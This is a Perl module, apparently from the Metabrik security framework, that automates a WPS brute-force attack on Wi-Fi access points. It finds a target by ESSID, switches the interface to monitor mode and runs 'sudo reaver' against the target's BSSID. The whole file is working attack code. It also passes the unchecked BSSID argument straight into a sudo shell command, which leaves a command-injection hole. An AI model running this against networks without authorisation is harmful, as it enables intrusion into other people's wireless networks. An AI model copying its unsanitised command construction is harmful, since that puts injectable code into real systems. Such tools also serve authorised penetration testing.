#
# $Id$
#
# network::wps Brik
#
package Metabrik::Network::Wps;
use strict;
use warnings;

use base qw(Metabrik::Network::Wlan);

sub brik_properties {
   return {
      revision => '$Revision$',
      tags => [ qw(unstable wifi wlan network wps) ],
      commands => {
         brute_force_wps => [ qw(essid bssid|OPTIONAL) ],
      },
      require_used => {
         'shell::command' => [ ],
      },
      require_binaries => {
         'sudo', => [ ],
         'reaver', => [ ],
      },
   };
}

sub brute_force_wps {
   my $self = shift;
   my ($essid, $bssid) = @_;

   if (! defined($essid)) {
      return $self->log->error($self->brik_help_run('brute_force_wps'));
   }

   my $context = $self->context;

   # If user provided bssid, we skip auto-detection
   if (! defined($bssid)) {
      my $scan = $self->scan;
      if (! defined($scan)) {
         return $self->log->error("brute_force_wps: no AP found?");
      }

      my $ap;
      for my $this (keys %$scan) {
         $self->log->info("this[$this] essid[$essid]");
         if ($scan->{$this}->{essid} eq $essid) {
            $ap = $scan->{$this};
            last;
         }
      }

      if (! defined($ap)) {
         return $self->log->error("brute_force_wps: no AP found by that essid [$essid]");
      }

      $bssid = $ap->{address};
   }

   my $monitor = $self->start_monitor_mode or return;

   my $cmd = "sudo reaver -i $monitor -b $bssid -vv";
   my $r = $context->run('shell::command', 'system', $cmd);

   $self->stop_monitor_mode;

   return $r;
}

1;

__END__
